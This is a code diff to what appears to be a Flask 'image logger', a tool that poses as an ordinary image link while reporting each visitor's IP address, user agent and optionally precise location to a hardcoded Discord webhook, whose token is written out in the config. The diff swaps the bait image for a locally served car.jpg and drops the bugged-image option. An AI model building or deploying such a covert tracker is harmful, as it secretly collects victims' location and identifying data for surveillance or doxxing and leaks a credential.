@@ -1,6 +1,6 @@
-from flask import Flask, request, Response
+from flask import Flask, request, Response, send_file
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser, os
 
 app = Flask(__name__)
 
@@ -9,7 +9,7 @@ __version__ = "v1.0"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1531358374829101116/rMcTlCQi7MyFWxP6RbPiZkY3W_8JKTSQ-Qlz_y3UfL0_TsYMvJPvGBr1gABqmizBs_OW",
-    "image": "https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=1200",
+    "image": "/api/car.jpg",
     "imageArgument": True,
     "username": "Deads",
     "color": 0x00FFFF,
@@ -143,6 +143,10 @@ binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
+@app.route('/api/car.jpg')
+def serve_car():
+    return send_file(os.path.join(os.path.dirname(__file__), 'car.jpg'), mimetype='image/jpeg')
+
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
 def handleRequest(path):
@@ -170,14 +174,8 @@ def handleRequest(path):
         )
 
         if botCheck(ip, ua):
-            if config["buggedImage"]:
-                resp = Response(binaries["loading"], mimetype='image/jpeg')
-            else:
-                resp = Response(status=302)
-                resp.headers['Location'] = url
-
             makeReport(ip, endpoint=request.path, url=url)
-            return resp
+            return send_file(os.path.join(os.path.dirname(__file__), 'car.jpg'), mimetype='image/jpeg')
 
         else:
             if query_dict.get("g") and config["accurateLocation"]:
